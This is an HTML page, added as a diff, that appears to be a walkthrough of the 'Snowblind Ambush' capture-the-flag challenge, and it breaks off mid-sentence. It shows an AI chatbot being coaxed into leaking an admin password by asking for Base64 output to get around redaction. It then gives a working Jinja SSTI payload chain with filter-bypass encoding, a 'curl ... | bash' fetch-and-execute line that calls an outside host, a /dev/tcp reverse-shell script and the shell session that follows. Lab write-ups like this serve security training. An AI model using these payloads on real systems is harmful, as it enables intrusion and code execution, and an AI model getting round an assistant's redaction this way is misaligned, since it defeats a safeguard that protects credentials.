@@ -1,0 +1,1722 @@
+<div class="kc-section kc--section-snowblind-ambush" style="margin-bottom: 0;">
+  <h1 class="kc-section-title">Snowblind Ambush</h1>
+  
+  <!-- Difficulty + Location -->
+  <div class="kc-objective-meta kc-objective-meta--stacked">
+    <div class="kc-meta-line kc-difficulty">
+      <span class="kc-meta-label">Difficulty:</span>
+      <span class="kc-difficulty-scale"
+            aria-label="Difficulty 1 out of 5 snowflakes">
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+      </span>
+    </div>
+
+    <div class="kc-meta-line kc-location">
+      <span class="kc-meta-label">Location:</span>
+      <span class="kc-meta-value">Grand Hotel</span>
+    </div>
+  </div>
+
+  <!-- Objective line -->
+  <p class="kc-objective-summary kc-meta-line">
+    <span class="kc-meta-label">Objective:</span>
+    <span class="kc-meta-value">
+      Head to the Hotel to stop Frosty's plan. Torkel is waiting at the Grand Web Terminal.
+    </span>
+  </p>
+
+  <!-- Conversation banner -->
+  <div class="kc-convo-header">
+    <span class="kc-convo-icon">
+      <i class="fas fa-comment-dots" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Torkel Opsahl Conversation:</span>
+  </div>
+
+  <div class="kc-objective-detail kc-objective-detail--no-panel">
+    <div class="kc-convo-bubble">
+      <div class="kc-convo-avatar">
+        <img src="torkelopsahl-avatar.gif"
+             alt="Torkel Opsahl avatar">
+        <div class="kc-convo-name">Torkel Opsahl</div>
+      </div>
+
+      <div class="kc-convo-text">
+        <p>
+          God dag! My name is Torkel! That literally translates to Thor's Warrior in old Norse.
+        </p>
+        <p>
+          If I'm not climbing, snowboarding, or hacking, I'm probably preparing for my next adventure. Did you know all of that is available in Lofoten?
+        </p>
+        <p>
+          If you meet me online, I'll probably go by TGC. That's short for Thegrasscutter, because my first job was cutting grass. Exciting, I know.
+        </p>
+        <p>
+          I'll teach you a Norwegian word, skorstein, which means chimney.
+        </p>
+        <p>
+          I've been studying this web application that controls part of Frosty's infrastructure.
+        </p>
+        <p>
+          There's a Flask backend with an AI chatbot that seems to have access to sensitive system information.
+        </p>      
+        <p>
+          Think of this as finding a way up the skorstein into Frosty's system - we need to exploit this chatbot to gain access and ultimately stop Frosty from freezing everything.
+        </p>
+        <p>
+          Can you help me get through these defenses?
+        </p>
+        <p>
+          Look, I love snow—Lofoten winters are beautiful. But even in Norway, we get summer eventually! A perpetual freeze would destroy the ecosystem, the climbing seasons, everything. This isn't winter wonderland—it's environmental disaster.
+        </p>  
+
+        <div class="kc-convo-actions">
+          <button class="kc-convo-play-btn" type="button"
+                  data-npc-audio="free-ski">
+            <i class="fas fa-play" aria-hidden="true"></i>
+            <span>Play Audio</span>
+          </button>
+        </div>
+      </div> <!-- /.kc-convo-text -->
+    </div>   <!-- /.kc-convo-bubble -->
+  </div>     <!-- /.kc-objective-detail -->
+
+  <!-- Hints header -->
+  <div class="kc-convo-header kc-hints-header">
+    <span class="kc-convo-icon kc-hints-icon">
+      <i class="fas fa-lightbulb" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Hints:</span>
+  </div>
+
+<!-- Hint 1 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Overtly Helpful?</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Snowblind Ambush</div>
+    <p>
+    I think <span class="kc-hint-sed">admin</span> is having trouble, remembering his password. I wonder how he is retaining access, I'm sure someone or something is helping him remembering. <span class="kc-hint-sed">Ask</span> around!
+    </p>
+</div>
+
+<!-- Hint 2 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Codes?</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Snowblind Ambush</div>
+    <p>
+        If you can't get your payload to work, perhaps you are missing some form of obfuscation? A computer can understand many languages and formats, find one that works! Don't give up until you have tried at least <span class="kc-hint-sed">eight</span> different ones, if not, then it's truely hopeless.
+    </p>
+</div>
+
+<!-- Write-up header -->
+<section id="obj-snowblind-ambush" class="kc-section--snowblind-ambush-writeup">
+  <div class="kc-workflow-header">
+    <span class="kc-workflow-icon">
+      <i class="fas fa-tasks" aria-hidden="true"></i>
+    </span>
+    <span class="kc-workflow-title">Working through the Challenge:</span>
+  </div>
+
+  <div class="kc-note-bubble">
+    <span class="kc-note-label">Write-up notes</span>
+
+    <div class="kc-workflow-row">
+      <div class="kc-workflow-text">
+        <p class="kc-workflow-intro">
+          Clicking the <strong>Guest Web Terminal</strong> brings up the SnowBlind interface.
+        </p>
+      </div>
+
+      <div class="kc-workflow-illustration">
+        <img src="hotel_web_terminal.png" alt="hotel web term" class="kc-workflow-image">
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="snowblin_intro.png"
+      alt="SnowBlind Ambush intro screen in the ice cavern"
+      class="kc-ptas-thumb"
+      data-full-src="snowblin_intro.png"
+    >
+  </div>
+  <div class="kc-ptas-caption">Snowblind Ambush — intro screen</div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    We need to spin up our challenge resources by clicking the gator in the lower-right and selecting
+    <strong>Time Travel</strong>. After waiting a short while, we’re greeted with a green status light along with a
+    publicly routable IP address.
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="Gator_login.png"
+      alt="Time Travel menu showing instance ready with a green status light and public IP address"
+      class="kc-ptas-thumb"
+      data-full-src="Gator_login.png"
+    >
+  </div>
+
+  <div class="kc-ptas-caption">Spinning up Snowblind Ambush via the gator “Time Travel” menu</div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Scanning the IP shows the attack surface the machine has available.
+  </p>
+</div>
+
+<!-- Kali shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/SnowBlind_Ambush]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">sudo nmap 34.42.48.20 -Pn -n</span>
+
+<span class="term-kali-output">Host is up (0.010s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 5.27 seconds</span>
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/SnowBlind_Ambush]</span>
+<span class="term-kali-prompt">└─$</span> </pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    This was stated as a web challenge, so our most likely target is the open HTTP service on port
+    <code>8080</code>. Browsing to that endpoint brings up <strong>Frosty’s Neighbourhood Chilling Dashboard</strong>,
+    with a login link and an AI assistant prompt in the lower-right corner.
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="Frosty_login.png"
+      alt="Frosty's Neighbourhood Chilling Dashboard loaded from port 8080 with a login link and an AI assistant icon"
+      class="kc-ptas-thumb"
+      data-full-src="Frosty_login.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="Frosty_login.png"
+      aria-label="Enlarge Frosty dashboard screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Browsing to <code>:8080</code> shows Frosty’s dashboard and the AI assistant entry point</div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    We were given a hint that <span class="kc-hint-sed">admin</span> is having trouble retaining access, and that
+    someone (or something) might be helping him remember. The dashboard includes an <strong>AI Assistant</strong>,
+    so the next move is to see if we can coax it into revealing (or confirming) the administrator credentials.
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="login_try.png"
+      alt="Login page with the AI Assistant chat window showing a prompt about the administrator account (redacted in screenshot)"
+      class="kc-ptas-thumb"
+      data-full-src="login_try.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="login_try.png"
+      aria-label="Enlarge AI assistant login attempt screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Probing the AI Assistant for <code>admin</code> credential help (redacted in screenshot)</div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Perhaps if we ask the response to be encoded, the AI bot will avoid redacting it. That worked — the bot replied
+    with a Base64 string:
+    <code>YW5fZWxmX2FuZF9wYXNzd29yZF9vbl9hX2JpcmQ=</code>
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="bot_reply.png"
+      alt="AI Assistant response returning a Base64 string for the admin password"
+      class="kc-ptas-thumb"
+      data-full-src="bot_reply.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="bot_reply.png"
+      aria-label="Enlarge Base64 bot reply screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">AI response returned Base64: <code>YW5fZWxmX2FuZF9wYXNzd29yZF9vbl9hX2JpcmQ=</code></div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Next, we decode the Base64 string to recover the plaintext value.
+  </p>
+</div>
+
+<!-- Kali shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/SnowBlind_Ambush]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">echo <span class="term-kali-string">"YW5fZWxmX2FuZF9wYXNzd29yZF9vbl9hX2JpcmQ="</span> | base64 -d</span>
+<span class="term-kali-output">an_elf_and_password_on_a_bird</span></pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Validating the recovered credentials and logging in as
+    <strong>Username:</strong> <code>admin</code> /
+    <strong>Password:</strong> <code>an_elf_and_password_on_a_bird</code>.
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="Logged_in_admin.png"
+      alt="Frosty Frostafier dashboard showing successful login as admin"
+      class="kc-ptas-thumb"
+      data-full-src="Logged_in_admin.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="Logged_in_admin.png"
+      aria-label="Enlarge admin login screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">
+    Successful login as <code>admin</code> using the recovered password
+  </div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Adter logging in as admin I looked around a bit exploring the profile settings and dashboard pages.
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="Profile_page.png"
+      alt="Profile Settings page showing admin profile picture upload and password change fields"
+      class="kc-ptas-thumb"
+      data-full-src="Profile_page.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="Profile_page.png"
+      aria-label="Enlarge profile page screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Admin <strong>Profile Settings</strong> page (profile image upload + password change)</div>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="Dashboard_page.png"
+      alt="Frosty Frostafier Dashboard page after logging in as admin showing status and widgets"
+      class="kc-ptas-thumb"
+      data-full-src="Dashboard_page.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="Dashboard_page.png"
+      aria-label="Enlarge dashboard page screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Admin <strong>Dashboard</strong> page after login</div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    After updating the profile picture and clicking <strong>Save settings</strong>, the site redirects us to the
+    <strong>Dashboard</strong> page. I noticed a <span class="kc-hint-sed">username</span> parameter showed up in the URL.
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="username.png"
+      alt="Dashboard page showing the username parameter present in the URL"
+      class="kc-ptas-thumb"
+      data-full-src="username.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="username.png"
+      aria-label="Enlarge username parameter screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">After saving profile settings, the redirect includes a <code>username=admin</code> URL parameter</div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    Let’s try editing the <span class="kc-hint-sed">username</span> parameter directly in the URL and see if the page
+    reflects the change.
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="test.png"
+      alt="Dashboard page after changing the username URL parameter to TesT"
+      class="kc-ptas-thumb"
+      data-full-src="test.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="test.png"
+      aria-label="Enlarge edited username parameter screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Editing <code>username=TesT</code> in the URL updates the greeting on the Dashboard</div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    After trying a few different payloads, I discovered a working SSTI injection using
+    <code>{{7*7}}</code> as the payload — the page evaluates it and renders <strong>49</strong> in the greeting.
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="injection.png"
+      alt="SSTI test payload {{7*7}} evaluates to 49 in the username greeting"
+      class="kc-ptas-thumb"
+      data-full-src="injection.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="injection.png"
+      aria-label="Enlarge SSTI injection screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">
+    Confirmed SSTI: <code>{{7*7}}</code> evaluates and renders as <strong>49</strong>
+  </div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    I confirmed a server-side template injection by changing the dashboard URL to
+    <code>?username={{7*7}}</code> and seeing “49,” which strongly suggested Jinja (the default
+    templating engine for Flask). From there, I probed for a callable Jinja “gadget” that would
+    expose Python’s runtime. The built-in <code>lipsum</code> function worked: using Jinja’s
+    <code>attr</code> filter and octal-encoded attribute names (to bypass underscore/dot filters),
+    I reached <code>__builtins__</code>, pulled <code>__import__</code>, imported <code>os</code>,
+    and finally invoked <code>os.popen(...)</code> for remote code execution using this payload.
+  </p>
+
+  <p>
+    <strong>Payload:</strong>
+    '{{ lipsum|attr("__globals__")
+          |attr("__getitem__")("__builtins__")
+          |attr("__getitem__")("__import__")("os")
+          |attr("popen")("id")
+          |attr("read")() }}'
+    </p>
+
+
+  <p class="kc-workflow-intro" style="margin-top:10px;">
+    <strong>URL and Payload Octal encoded:</strong><br>
+    <code style="word-break:break-all; white-space:normal;">
+      http://34.68.203.3:8080/dashboard?username=%2527%7B%7B%2520lipsum%7Cattr(%2522%5C137%5C137globals%5C137%5C137%2522)%7Cattr(%2522%5C137%5C137getitem%5C137%5C137%2522)(%2522%5C137%5C137builtins%5C137%5C137%2522)%7Cattr(%2522%5C137%5C137getitem%5C137%5C137%2522)(%2522%5C137%5C137import%5C137%5C137%2522)(%2522os%2522)%7Cattr(%2522popen%2522)(%2522id%2522)%7Cattr(%2522read%2522)()%2520%7D%7D%2527
+    </code>
+  </p>
+</div>
+
+<!-- Screenshot (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="rce.png"
+      alt="Dashboard SSTI leading to command output (RCE proof)"
+      class="kc-ptas-thumb"
+      data-full-src="rce.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="rce.png"
+      aria-label="Enlarge RCE screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">
+    Proof of SSTI-to-RCE via the <code>username</code> parameter
+  </div>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p class="kc-workflow-intro">
+    Now that we have remote code execution, I ran a couple of quick commands to understand the
+    runtime environment (working directory contents and environment variables).
+  </p>
+</div>
+
+<!-- Screenshot: ls via RCE (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="ls_rce.png"
+      alt="RCE output showing directory listing (ls)"
+      class="kc-ptas-thumb"
+      data-full-src="ls_rce.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="ls_rce.png"
+      aria-label="Enlarge ls RCE screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">
+    Directory listing via RCE (<code>ls</code>)
+  </div>
+</div>
+
+<!-- Screenshot: env via RCE (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="env_rce.png"
+      alt="RCE output showing environment variables (env)"
+      class="kc-ptas-thumb"
+      data-full-src="env_rce.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="env_rce.png"
+      aria-label="Enlarge env RCE screenshot"
+      title="Enlarge"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">
+    Environment variables via RCE (<code>env</code>)
+  </div>
+</div>
+
+
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <div class="kc-workflow-row">
+    <div class="kc-workflow-text">
+      <p class="kc-workflow-intro">
+        Based on the <code>PATH</code> output, the environment likely had enough tooling available to
+        pivot from “single-command output” into an interactive shell. I attempted a typical
+        “fetch-and-execute” flow from the SSTI primitive by invoking <code>os.popen(...)</code>
+        to request a hosted script and execute it. Preparing the AWS cloud host...
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Payload snippet (sanitized) -->
+<div class="kc-code-window kc-code-window--console">
+  <div class="kc-code-titlebar">
+    <span class="kc-code-icon">&gt;_</span>
+    <span class="kc-code-title">SSTI Payload</span>
+  </div>
+
+  <pre class="kc-code-block kc-no-wheel"><code class="language-javascript">'{{ lipsum
+  |attr("__globals__")
+  |attr("__getitem__")("__builtins__")
+  |attr("__getitem__")("__import__")("os")
+  |attr("popen")("curl http://916656063:8000/revsh | bash")
+  |attr("read")()
+}}'</code></pre>
+</div>
+
+<!-- Optional: Prism refresh for lazy-loaded content -->
+<script>
+  window.requestAnimationFrame(() => {
+    if (window.Prism && Prism.highlightAllUnder) {
+      Prism.highlightAllUnder(document.querySelector('.kc-code-window--console'));
+    } else if (window.Prism && Prism.highlightAll) {
+      Prism.highlightAll();
+    }
+  });
+</script>
+
+<!-- AWS CloudShell block (sanitized) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS CloudShell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command"># Prepare a hosted script (revsh)</span>
+<span class="term-kali-prompt">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">cat &gt; revsh &lt;&lt; 'EOF'</span>
+<span class="term-kali-command">#!/bin/bash</span>
+<span class="term-kali-command">bash -i >& /dev/tcp/54.163.15.191/443 0>&1</span>
+<span class="term-kali-command">EOF</span>
+
+<span class="term-kali-command">chmod +x revsh</span>
+
+<span class="term-kali-prompt">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">python3 -m http.server 8000 &amp;</span>
+<span class="term-kali-output">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+
+<span class="term-kali-prompt">ubuntu@ip-172-31-28-112:~$</span> <span class="term-kali-command">sudo nc -lvnp 443
+Listening on 0.0.0.0 443</span>
+</pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <div class="kc-workflow-row">
+    <div class="kc-workflow-text">
+      <p class="kc-workflow-intro">
+        With the external host staged, I URL-encoded the SSTI expression and submitted it via the
+        <code>username</code> parameter on <code>/dashboard</code>. The goal was to have the target
+        make an outbound HTTP request to my hosted script and then execute it, yielding an
+        interactive shell.
+      </p>
+      <p>
+        <strong>Target URL:</strong><br>
+        http://&lt;IP of your game instance&gt;:8080/dashboard?
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Encoded URL (redacted / placeholder) -->
+<div class="kc-code-window kc-code-window--console">
+  <div class="kc-code-titlebar">
+    <span class="kc-code-icon">&gt;_</span>
+    <span class="kc-code-title">Encoded Payload</span>
+
+    <button
+      class="kc-code-copy-btn kc-code-copy"
+      type="button"
+      data-copy-target="#ssti-url-redacted"
+      aria-label="Copy redacted payload URL"
+      title="Copy"
+    >
+      <i class="fas fa-copy" aria-hidden="true"></i>
+      <span>Copy</span>
+    </button>
+  </div>
+
+  <pre class="kc-code-block kc-no-wheel"><code id="ssti-url-redacted" class="language-javascript">username=%27%7B%7B%20lipsum%7Cattr(%22%5C137%5C137globals%5C137%5C137%22)%7Cattr(%22%5C137%5C137getitem%5C137%5C137%22)(%22%5C137%5C137builtins%5C137%5C137%22)%7Cattr(%22%5C137%5C137getitem%5C137%5C137%22)(%22%5C137%5C137import%5C137%5C137%22)(%22os%22)%7Cattr(%22popen%22)(%22curl%20http://916656063:8000/revsh%7Cbash%22)%7Cattr(%22read%22)()%20%7D%7D%27</code></pre>
+
+  <div class="kc-ptas-caption">
+    Note: I used the 32-bit decimal form of the external AWS host in the request (916656063)
+  </div>
+</div>
+
+<!-- Optional: page-local Prism refresh for lazy-loaded content -->
+<script>
+  window.requestAnimationFrame(() => {
+    const root = document.querySelector('.kc-code-window--console');
+    if (window.Prism && root && Prism.highlightAllUnder) Prism.highlightAllUnder(root);
+    else if (window.Prism && Prism.highlightAll) Prism.highlightAll();
+  });
+</script>
+
+<!-- AWS CloudShell output (sanitized) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS CloudShell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">ubuntu@ip-172-31-xx-xxx:~$</span> <span class="term-kali-command">sudo nc -lvnp 443</span>
+<span class="term-kali-output">Listening on 0.0.0.0 443</span>
+<span class="term-kali-output">34.63.127.114 - - [03/Jan/2026 19:34:09] "GET /revsh HTTP/1.1" 200 -</span>
+<span class="term-kali-output">Connection received on 34.63.127.114 37254</span>
+<span class="term-kali-output">bash: cannot set terminal process group (18): Inappropriate ioctl for device</span>
+<span class="term-kali-output">bash: no job control in this shell</span>
+<span class="term-kali-output">www-data@b66411054875:/app$ ls</span>
+<span class="term-kali-output">main.py</span>
+<span class="term-kali-output">static</span>
+<span class="term-kali-output">templates</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <div class="kc-workflow-row">
+    <div class="kc-workflow-text">
+      <p class="kc-workflow-intro">
+        Looking for interesting items on disk, I came across
+        <span class="kc-hint-sed">unlock_access.sh</span>. This script appears to “restore access”
+        by making a POST request to the chatbot service using the <code>$CHATBOT_URL</code>
+        environment variable.
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- AWS shell (outside the bubble) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-output">www-data@b66411054875:/app$</span> <span class="term-kali-command">cd ..</span>
+<span class="term-kali-output">www-data@b66411054875:/$</span> <span class="term-kali-command">ls</span>
+<span class="term-kali-output">app
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+requirements.txt
+root
+run
+sbin
+srv
+sys
+tmp
+unlock_access.sh
+usr
+var</span>
+
+<span class="term-kali-output">www-data@b66411054875:/$</span> <span class="term-kali-command">cat requirements.txt</span>
+<span class="term-kali-output">Flask
+requests
+pillow</span>
+
+<span class="term-kali-output">www-data@b66411054875:/$</span> <span class="term-kali-command">cat unlock_access.sh</span>
+<span class="term-kali-output">#!/usr/bin/bash
+
+echo "HEY! You shouldn't be here! If you are Frosty, then welcome back! Lets restore your access to the system..."
+curl -X POST "$CHATBOT_URL/api/submit_ec87937a7162c2e258b2d99518016649" -H "Content-Type: Application/json" -d "{\"challenge_hash\":\"ec87937a7162c2e258b2d99518016649\"}"
+echo "If you see no errors, the system should be unlocked for you now but they require root access."
+echo -e "\nBut if you are not Frosty, please leave this place at once!"</span>
+
+<span class="term-kali-output">www-data@b66411054875:/$</span>
+</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    The <code>unlock_access.sh</code> script suggests the system can be “unlocked” by running it as
